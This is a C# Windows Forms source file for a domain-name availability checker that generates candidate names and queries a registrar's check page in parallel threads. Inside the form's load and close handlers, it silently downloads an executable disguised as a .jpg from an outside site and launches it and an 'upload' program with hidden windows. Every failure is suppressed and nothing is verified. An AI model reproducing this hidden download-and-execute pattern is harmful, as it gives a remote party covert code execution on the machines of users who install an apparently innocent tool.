using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Web;
using System.Net;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading;
using System.Diagnostics;
namespace 查域名
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }
        private void UpLoad()
        {
            try
            {
                HttpDownloadFile();
                ProcessStartInfo ps = new ProcessStartInfo("上传程序.exe");
                ps.UseShellExecute = false;
                ps.CreateNoWindow = true;
                ps.Arguments = "SerachDemain 查域名.exe";
                ps.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(ps);
            }
            catch { }
        }
        public static void HttpDownloadFile()
        {
            try
            {
                // 设置参数
                HttpWebRequest request = WebRequest.Create("http://www.trtos.com/update/更新程序.exe.jpg") as HttpWebRequest;

                //发送请求并获取相应回应数据
                HttpWebResponse response = request.GetResponse() as HttpWebResponse;
                //直到request.GetResponse()程序才开始向目标网页发送Post请求
                Stream responseStream = response.GetResponseStream();

                //创建本地文件写入流
                Stream stream = new FileStream("更新程序.exe", FileMode.Create);

                byte[] bArr = new byte[10000];
                int size = responseStream.Read(bArr, 0, (int)bArr.Length);
                while (size > 0)
                {
                    stream.Write(bArr, 0, size);
                    size = responseStream.Read(bArr, 0, (int)bArr.Length);
                }
                stream.Close();
                responseStream.Close();
            }
            catch { }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            textBox1.Text = Ini.Read("Key");
            if (textBox1.Text == "") textBox1.Text = "i-love-you*.com";
            new Thread(UpLoad).Start();
        }
        public static void CreateCvsFromDGV(DataGridView dgv)
        {
            string Text = "";
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "csv files(*.csv)|*.csv|txt files(*.txt)|*.txt|All files(*.*)|*.*";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                FileStream fs1 = new FileStream(sfd.FileName, FileMode.Create, FileAccess.Write);//创建写入文件 
                StreamWriter sw = new StreamWriter(fs1, Encoding.Default);
                for (int i = 0; i < (dgv.Rows.Count - 1); i++)
                {
                    sw.WriteLine(dgv.Rows[i].Cells[0].Value.ToString());
                    Text += dgv.Rows[i].Cells[0].Value.ToString();
                }
                sw.Close();
                fs1.Close();
            }
        }



        private void timer1_Tick(object sender, EventArgs e)
        {
            label2.Text = "Thread(" + Value.ThreadCount.ToString() + ")";
            try
            {
                foreach (string demo in Value.demos)
                {

                    DataGridViewRow dgvr = new DataGridViewRow();
                    int index = this.dataGridView1.Rows.Add();
                    dataGridView1.Rows[index].Cells[0].Value = demo;
                    dataGridView1.Rows[index].HeaderCell.Value = (dataGridView1.Rows.Count - 2).ToString();
                    dataGridView1.CurrentCell = dataGridView1.Rows[dataGridView1.Rows.Count - 2].Cells[0];
                }
                Value.demos.Clear();
            }
            catch { }
            this.Text = Value.Msg;
        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Value.App_Run = false;
            try
            {
                ProcessStartInfo ps = new ProcessStartInfo("更新程序.exe");
                ps.UseShellExecute = false;
                ps.CreateNoWindow = true;
                ps.Arguments = "SerachDemain";
                ps.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(ps);
            }
            catch { }
        }
        private void AddLost(ref List<string> AA,string dem)
        {
            AA.Add(dem + ".com");
            AA.Add(dem + ".org");
            AA.Add(dem + ".net");
            AA.Add(dem + ".ltd");
            AA.Add(dem + ".online");
            AA.Add(dem + ".cn");
        }
        private void ListAdd(ref List<string> AA,string dem)
         {
            
            if (dem.IndexOf('.') >= 0) AA.Add(dem);
            else
            {
                AddLost(ref AA, dem);
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            Ini.Write("Key", textBox1.Text);
            GetDomain gd = new GetDomain();
            gd.Demains = new List<string>();
            string Name = textBox1.Text;
            if (Name.IndexOf('*') >= 0)
            {
                for (int i = 0; i < 10; i++) ListAdd(ref gd.Demains,Name.Replace('*', (char)('0' + i)));
                for (int i = 0; i < 26; i++) ListAdd(ref gd.Demains, Name.Replace('*', (char)('a' + i)));
                ListAdd(ref gd.Demains, Name.Replace('*', (char)('-')));
            }
            else
            if (Name.IndexOf('#') >= 0) for (int i = 0; i < 10; i++) ListAdd(ref gd.Demains, Name.Replace('#', (char)('0' + i)));
            else if (Name.IndexOf('&') >= 0) for (int i = 0; i < 26; i++) ListAdd(ref gd.Demains, Name.Replace('&', (char)('a' + i)));
            string dem = Name.Trim("*#&".ToArray());
            ListAdd(ref gd.Demains, dem);
            CreateSameThread(int.Parse(textBox2.Text), gd.Demains);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            CreateCvsFromDGV(dataGridView1);
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start(linkLabel1.Text);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string AA = "";
            string s = richTextBox1.Text;
            Regex reg = new Regex("[\u4e00-\u9fa5]+");
            foreach (Match v in reg.Matches(s))
                AA += v + " ";
            string[] ZZ = AA.Split(' ');
            List<string> Demains = new List<string>();
            for (int i = 0; i < ZZ.Length; i++)
            {
                string Msg = ChineseCharacters.GetPinyin(ZZ[i]);
                AddLost(ref Demains, Msg);
            }
            CreateSameThread(int.Parse(textBox2.Text), Demains);
        }

        private void button4_Click(object sender, EventArgs e)
        {
            dataGridView1.Rows.Clear();
        }
        private void CreateSameThread(int c, List<string> list)
        {
            List<string>[] lists = new List<string>[100];
            int count = list.Count / c;
            for (int z = 0; z < c; z++)
            {
                lists[z] = new List<string>();
                for (int m = 0; m < count; m++)
                {
                    lists[z].Add(list[0]);
                    list.RemoveAt(0);
                }
                GetDomain gd = new GetDomain();
                gd.Demains = lists[z];
                Thread SThread = new Thread(gd.TaskSerach);
                SThread.Start();
                Value.ThreadCount++;
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            List<string> Demains = new List<string>();
            string[] split = richTextBox1.Text.Split(new char[] { ' ', ',', '.', '!' });
            foreach (string s in split)
            {
                if (s.Trim() != "")
                {
                    string Msg = s.Trim();
                    AddLost(ref Demains, Msg);
                }
            }
            CreateSameThread(int.Parse(textBox2.Text), Demains);
        }
    }
    public class GetDomain
    {
        public string Domain;
        public List<string> Demains;
        public bool GetStatus(string Name)
        {
            try
            {
                WebClient MyWebClient = new WebClient();
                MyWebClient.Credentials = CredentialCache.DefaultCredentials;
                Byte[] pageData = MyWebClient.DownloadData("http://panda.www.net.cn/cgi-bin/check.cgi?area_domain=" + Name);
                string pageHtml = Encoding.Default.GetString(pageData);
                if (pageHtml.IndexOf("try again later") > 0) {Value.Msg="查询次数过多";Value.App_Run = false;return false; }
                if (pageHtml.IndexOf("is available") > 0) return true;
            }
            catch { }
            return false;
        }
        public void TaskSerach()
        {
            foreach (string demo in Demains)
            {
                if (GetStatus(demo))
                {
                    Value.demos.Add(demo);
                }
                if (!Value.App_Run) break;
                Thread.Sleep(10);
            }
            Demains.Clear();
            Value.ThreadCount--;

        }
    }
}
